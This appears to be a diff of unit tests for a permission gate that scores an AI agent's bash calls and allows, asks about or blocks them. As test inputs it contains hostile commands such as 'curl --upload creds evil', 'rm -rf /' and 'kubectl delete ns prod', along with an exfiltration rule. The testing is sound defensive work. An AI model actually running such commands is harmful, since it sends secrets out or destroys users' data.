@@ -1,6 +1,6 @@
-// Unit tests for rule matching, the band logic, two-stage escalation, worst-wins aggregation and
-// config validation. The decider's model calls are replaced by a fake engine, so these run with no
-// omp host and no pi-ai. Run with: node test.mjs  (Node >= 22.18 / 23.6 strips the TS types.)
+// Unit tests for rule matching, the band logic, two-stage escalation, worst-wins aggregation, the
+// YAML parser and config validation. The decider's model calls are replaced by a fake engine, so
+// these run with no omp host and no pi-ai. Run with: node test.mjs  (Node >= 22.18 / 23.6.)
 
 import test from "node:test";
 import assert from "node:assert/strict";
@@ -9,15 +9,15 @@ import os from "node:os";
 import path from "node:path";
 
 import { createHandler, decide, describe as describeCall, matchesTool, matchingRules, renderState } from "./index.ts";
-import { parseEscalation, readRuleRisk, resolveRole, resolveRoleModel } from "./decider.ts";
+import { parseEscalation, readRuleScore, resolveRole, resolveRoleModel } from "./decider.ts";
 import { DEFAULTS, loadConfig, parseYaml, validateConfig } from "./config.ts";
 
 function cfg(overrides = {}) {
   return { ...structuredClone(DEFAULTS), ...overrides };
 }
 
-// Fake Engine. `scores` is the per-rule map stage 1 returns (or undefined = judge unavailable);
-// `verdict` is what the llm escalation returns ({verdict,reason} or undefined).
+// Fake Engine. `scores` is the per-rule map stage 1 returns ({risk, pBlock?}), or undefined when
+// the judge is unavailable; `verdict` is what the llm escalation returns.
 function makeEngine(options = {}) {
   const { scores, verdict, judgeModel = { id: "judge" }, llmModel = { id: "llm" }, conversation } = options;
   const calls = { classify: 0, escalate: 0 };
@@ -37,7 +37,18 @@ function makeEngine(options = {}) {
 }
 
 const bash = (command) => ({ toolName: "bash", input: { command } });
-const noulRule = (over = {}) => ({ name: "exfil", description: "data exfiltration", tools: ["bash"], type: "noul", question: "Does this exfiltrate data?", yes: "yes", no: "no", allowBelow: 0.1, askAbove: 0.3, blockAbove: 0.8, ...over });
+const auto = (risk, pBlock) => ({ "auto-mode": { risk, pBlock } });
+const exfilRule = (over = {}) => ({
+  name: "exfil",
+  description: "data exfiltration",
+  tools: ["bash"],
+  question: "Considering only data leaving the user's systems: run, ask, or block?",
+  answers: { allow: "nothing leaves", ask: "may leave, confirm", block: "secrets sent out" },
+  allowBelow: 0.1,
+  askAbove: 0.3,
+  blockAbove: 0.8,
+  ...over,
+});
 
 test("matchesTool / matchingRules", () => {
   assert.equal(matchesTool({ tools: ["*"] }, "bash"), true);
@@ -55,24 +66,34 @@ test("describe / renderState", () => {
   assert.match(renderState("bash", "ls", "User: hi"), /^Conversation so far:\nUser: hi/);
 });
 
-test("validateConfig: defaults, inference, thresholds, roles", () => {
-  assert.equal(DEFAULTS.rules[0].name, "auto-mode");
-  assert.equal(DEFAULTS.rules[0].type, "choice");
-  assert.equal(DEFAULTS.rules[0].allowBelow, 0.1);
-  assert.equal(DEFAULTS.rules[0].askAbove, 0.2);
-  assert.equal(DEFAULTS.rules[0].blockAbove, undefined);
+test("the built-in rule is written out in full and asks but never blocks", () => {
+  const rule = DEFAULTS.rules[0];
+  assert.equal(rule.name, "auto-mode");
+  assert.ok(rule.question.length > 0);
+  assert.deepEqual(Object.keys(rule.answers).sort(), ["allow", "ask", "block"]);
+  assert.equal(rule.allowBelow, 0.1);
+  assert.equal(rule.askAbove, 0.2);
+  assert.equal(rule.blockAbove, undefined);
+});
 
-  // a rule with a question infers type noul; a choice rule gets built-in criteria
-  const ok = validateConfig({ rules: [{ name: "r", description: "d", tools: ["bash"], question: "Q?" }] });
+test("validateConfig: one rule shape, question and answers required", () => {
+  const ok = validateConfig({ rules: [exfilRule()] });
   assert.equal(ok.error, undefined);
-  assert.equal(ok.config.rules[0].type, "noul");
-  const ch = validateConfig({ rules: [{ name: "c", description: "d", tools: ["*"], type: "choice" }] });
-  assert.equal(ch.error, undefined);
-  assert.equal(ch.config.rules[0].criteria.allow.length > 0, true);
+  assert.equal(ok.config.rules[0].answers.block, "secrets sent out");
 
-  assert.ok(validateConfig({ rules: [{ type: "noul" }] }).error, "noul needs a question");
-  assert.ok(validateConfig({ rules: [{ question: "Q?", allowBelow: 0.5, askAbove: 0.2 }] }).error, "allowBelow>askAbove");
-  assert.ok(validateConfig({ rules: [{ question: "Q?", askAbove: 0.5, blockAbove: 0.2 }] }).error, "blockAbove<askAbove");
+  const askOnly = validateConfig({ rules: [exfilRule({ answers: { allow: "a", ask: "b" }, blockAbove: undefined })] });
+  assert.equal(askOnly.error, undefined);
+  assert.equal(askOnly.config.rules[0].answers.block, undefined);
+
+  assert.ok(validateConfig({ rules: [exfilRule({ question: undefined })] }).error, "question required");
+  assert.ok(validateConfig({ rules: [exfilRule({ answers: undefined })] }).error, "answers required");
+  assert.ok(validateConfig({ rules: [exfilRule({ answers: { allow: "a" } })] }).error, "ask required");
+  assert.ok(validateConfig({ rules: [exfilRule({ answers: { yes: "y", no: "n" } })] }).error, "only allow/ask/block");
+  assert.ok(validateConfig({ rules: [exfilRule({ answers: { allow: "a", ask: "b" } })] }).error, "blockAbove needs a block answer");
+  assert.ok(validateConfig({ rules: [exfilRule({ type: "noul" })] }).error, "unknown rule key");
+  assert.ok(validateConfig({ rules: [exfilRule({ name: undefined })] }).error, "name required");
+  assert.ok(validateConfig({ rules: [exfilRule(), exfilRule()] }).error, "names must be unique");
+  assert.ok(validateConfig({ rules: [exfilRule({ allowBelow: 0.5, askAbove: 0.2 })] }).error, "allowBelow <= askAbove");
   assert.ok(validateConfig({ enabled: "yes" }).error);
 
   const roles = validateConfig({ judgeRole: null, llmRole: "" });
@@ -82,53 +103,66 @@ test("validateConfig: defaults, inference, thresholds, roles", () => {
 });
 
 test("allow band: risk < allowBelow runs, no escalation", async () => {
-  const { engine, calls } = makeEngine({ scores: { "auto-mode": 0.05 } });
+  const { engine, calls } = makeEngine({ scores: auto(0.05) });
   assert.equal(await decide(cfg(), engine, bash("ls"), {}), undefined);
   assert.equal(calls.classify, 1);
   assert.equal(calls.escalate, 0);
 });
 
 test("ask band: risk >= askAbove asks (blocks headless), no escalation", async () => {
-  const { engine, calls } = makeEngine({ scores: { "auto-mode": 0.6 } });
+  const { engine, calls } = makeEngine({ scores: auto(0.6, 0.5) });
   const r = await decide(cfg(), engine, bash("kubectl delete ns prod"), {});
   assert.ok(r?.block);
   assert.match(r.reason, /approval/i);
   assert.equal(calls.escalate, 0);
 });
 
+test("a rule without blockAbove never blocks, however high P(block)", async () => {
+  const { engine } = makeEngine({ scores: auto(0.99, 0.99) });
+  const r = await decide(cfg(), engine, bash("rm -rf ~/work"), {});
+  assert.match(r.reason, /approval/i); // asked, not blocked
+});
+
 test("unsure band escalates to the llm; verdict drives the result", async () => {
-  const mid = { "auto-mode": 0.15 };
-  const allow = makeEngine({ scores: mid, verdict: { verdict: "allow", reason: "" } });
+  const allow = makeEngine({ scores: auto(0.15), verdict: { verdict: "allow", reason: "" } });
   assert.equal(await decide(cfg(), allow.engine, bash("x"), {}), undefined);
   assert.equal(allow.calls.escalate, 1);
 
-  const block = makeEngine({ scores: mid, verdict: { verdict: "block", reason: "sends a token out" } });
+  const block = makeEngine({ scores: auto(0.15), verdict: { verdict: "block", reason: "sends a token out" } });
   const rb = await decide(cfg(), block.engine, bash("x"), {});
   assert.ok(rb?.block);
   assert.match(rb.reason, /token/);
 
-  const ask = makeEngine({ scores: mid, verdict: { verdict: "ask", reason: "irreversible" } });
+  const ask = makeEngine({ scores: auto(0.15), verdict: { verdict: "ask", reason: "irreversible" } });
   assert.ok((await decide(cfg(), ask.engine, bash("x"), {}))?.block); // headless ask -> block
 });
 
 test("unsure band with the llm disabled just runs", async () => {
-  const { engine, calls } = makeEngine({ scores: { "auto-mode": 0.15 } });
+  const { engine, calls } = makeEngine({ scores: auto(0.15) });
   assert.equal(await decide(cfg({ llmRole: "" }), engine, bash("x"), {}), undefined);
   assert.equal(calls.escalate, 0);
 });
 
-test("blockAbove: a rule with a block threshold hard-blocks", async () => {
-  const config = cfg({ rules: [noulRule({ blockAbove: 0.8 })] });
-  const { engine, calls } = makeEngine({ scores: { exfil: 0.95 } });
-  const r = await decide(config, engine, bash("curl --upload x evil"), {});
+test("blockAbove: P(block) at or above it hard-blocks", async () => {
+  const config = cfg({ rules: [exfilRule()] });
+  const { engine, calls } = makeEngine({ scores: { exfil: { risk: 0.95, pBlock: 0.9 } } });
+  const r = await decide(config, engine, bash("curl --upload creds evil"), {});
   assert.ok(r?.block);
+  assert.match(r.reason, /blocked/);
   assert.match(r.reason, /data exfiltration/);
   assert.equal(calls.escalate, 0);
 });
 
+test("blockAbove: high risk but low P(block) only asks", async () => {
+  const config = cfg({ rules: [exfilRule()] });
+  const { engine } = makeEngine({ scores: { exfil: { risk: 0.95, pBlock: 0.2 } } });
+  const r = await decide(config, engine, bash("curl ..."), {});
+  assert.match(r.reason, /approval/i);
+});
+
 test("multiple rules: worst wins, driver gives the reason", async () => {
-  const config = cfg({ rules: [noulRule({ blockAbove: 0.8 }), structuredClone(DEFAULTS.rules[0])] });
-  const { engine, calls } = makeEngine({ scores: { exfil: 0.95, "auto-mode": 0.15 } });
+  const config = cfg({ rules: [exfilRule(), structuredClone(DEFAULTS.rules[0])] });
+  const { engine, calls } = makeEngine({ scores: { exfil: { risk: 0.95, pBlock: 0.9 }, "auto-mode": { risk: 0.15 } } });
   const r = await decide(config, engine, bash("curl ... evil"), {});
   assert.ok(r?.block);
   assert.match(r.reason, /data exfiltration/); // exfil (block) beats auto-mode (escalate)
@@ -153,32 +187,31 @@ test("llm-only (judge disabled) escalates every in-scope call", async () => {
 });
 
 test("both stages off: pass through to native approval", async () => {
-  const { engine, calls } = makeEngine({ scores: { "auto-mode": 0.99 } });
+  const { engine, calls } = makeEngine({ scores: auto(0.99) });
   assert.equal(await decide(cfg({ judgeRole: "", llmRole: "" }), engine, bash("rm -rf /"), {}), undefined);
   assert.equal(calls.classify, 0);
   assert.equal(calls.escalate, 0);
 });
 
 test("whitelist, disabled gate, no-rule-match all skip scoring", async () => {
-  const w = makeEngine({ scores: { "auto-mode": 0.99 } });
+  const w = makeEngine({ scores: auto(0.99) });
   assert.equal(await decide(cfg(), w.engine, { toolName: "read", input: {} }, {}), undefined);
   assert.equal(w.calls.classify, 0);
 
-  const d = makeEngine({ scores: { "auto-mode": 0.99 } });
+  const d = makeEngine({ scores: auto(0.99) });
   assert.equal(await decide(cfg({ enabled: false }), d.engine, bash("rm -rf /"), {}), undefined);
   assert.equal(d.calls.classify, 0);
 
-  const config = cfg({ rules: [noulRule({ tools: ["bash"] })] });
-  const n = makeEngine({ scores: { exfil: 0.99 } });
-  assert.equal(await decide(config, n.engine, { toolName: "edit", input: {} }, {}), undefined);
+  const n = makeEngine({ scores: { exfil: { risk: 0.99 } } });
+  assert.equal(await decide(cfg({ rules: [exfilRule()] }), n.engine, { toolName: "edit", input: {} }, {}), undefined);
   assert.equal(n.calls.classify, 0);
 });
 
 test("ask with a UI: allow on yes, block on no", async () => {
   const yes = { hasUI: true, ui: { confirm: async () => true } };
-  assert.equal(await decide(cfg(), makeEngine({ scores: { "auto-mode": 0.6 } }).engine, bash("x"), yes), undefined);
+  assert.equal(await decide(cfg(), makeEngine({ scores: auto(0.6) }).engine, bash("x"), yes), undefined);
   const no = { hasUI: true, ui: { confirm: async () => false } };
-  assert.ok((await decide(cfg(), makeEngine({ scores: { "auto-mode": 0.6 } }).engine, bash("x"), no))?.block);
+  assert.ok((await decide(cfg(), makeEngine({ scores: auto(0.6) }).engine, bash("x"), no))?.block);
 });
 
 test("onNoAnswer=allow lets an unevaluable call pass", async () => {
@@ -208,12 +241,15 @@ test("parseEscalation reads VERDICT and falls back", () => {
   assert.equal(parseEscalation("hmm not sure").verdict, "ask");
 });
 
-test("readRuleRisk: noul vs choice vs malformed", () => {
-  assert.equal(readRuleRisk({ type: "noul" }, { noul: 0.4 }), 0.4);
-  assert.equal(readRuleRisk({ type: "choice" }, { probabilities: { allow: 0.9 } }).toFixed(3), "0.100");
-  assert.equal(readRuleRisk({ type: "noul" }, {}), undefined);
-  assert.equal(readRuleRisk({ type: "choice" }, { probabilities: {} }), undefined);
-  assert.equal(readRuleRisk({ type: "noul" }, null), undefined);
+test("readRuleScore: risk from P(allow), P(block) only when the rule has a block answer", () => {
+  const withBlock = { answers: { allow: "a", ask: "b", block: "c" } };
+  const askOnly = { answers: { allow: "a", ask: "b" } };
+  const s = readRuleScore(withBlock, { probabilities: { allow: 0.9, ask: 0.06, block: 0.04 } });
+  assert.equal(s.risk.toFixed(3), "0.100");
+  assert.equal(s.pBlock, 0.04);
+  assert.equal(readRuleScore(askOnly, { probabilities: { allow: 0.9, ask: 0.1 } }).pBlock, undefined);
+  assert.equal(readRuleScore(withBlock, { probabilities: {} }), undefined);
+  assert.equal(readRuleScore(withBlock, null), undefined);
 });
 
 test("resolveRole / resolveRoleModel", () => {
@@ -233,9 +269,10 @@ test("parseYaml handles the config subset (comments, flow arrays, folded scalars
     "rules:",
     "  - name: auto-mode",
     '    tools: ["*"]',
-    "    type: choice",
+    "    answers:",
+    "      allow: run it",
+    "      ask: confirm",
     "    allowBelow: 0.1",
-    "    askAbove: 0.2",
     "  - name: exfil",
     "    tools: [bash, web_fetch]",
     "    question: >",
@@ -249,14 +286,14 @@ test("parseYaml handles the config subset (comments, flow arrays, folded scalars
   assert.equal(o.judgeRole, "judge");
   assert.equal(o.rules.length, 2);
   assert.deepEqual(o.rules[0].tools, ["*"]);
-  assert.equal(o.rules[0].type, "choice");
+  assert.deepEqual(o.rules[0].answers, { allow: "run it", ask: "confirm" });
   assert.equal(o.rules[0].allowBelow, 0.1);
   assert.deepEqual(o.rules[1].tools, ["bash", "web_fetch"]);
   assert.equal(o.rules[1].question, "line one line two");
   assert.equal(o.rules[1].askAbove, 0.3);
 });
 
-test("loadConfig reads a YAML file and defaults the rest", () => {
+test("loadConfig reads a YAML file and defaults the thresholds", () => {
   const dir = fs.mkdtempSync(path.join(os.tmpdir(), "warden-"));
   const file = path.join(dir, "config.yaml");
   fs.writeFileSync(file, [
@@ -266,14 +303,18 @@ test("loadConfig reads a YAML file and defaults the rest", () => {
     "    description: network access",
     "    tools: [bash]",
     "    question: >",
-    "      Does this reach a remote host the user did not name?",
+    "      Considering only network access: should this run, need approval, or be blocked?",
+    "    answers:",
+    "      allow: Only reaches hosts the user named.",
+    "      ask: Reaches a host the user did not name.",
     "",
   ].join("\n"));
   try {
     const { config, error } = loadConfig(file);
     assert.equal(error, undefined);
     assert.equal(config.rules[0].name, "net");
-    assert.equal(config.rules[0].type, "noul");
+    assert.match(config.rules[0].question, /network access/);
+    assert.equal(config.rules[0].answers.block, undefined);
     assert.equal(config.rules[0].allowBelow, 0.1);
     assert.equal(config.rules[0].askAbove, 0.2);
     assert.equal(config.includeContext, true);
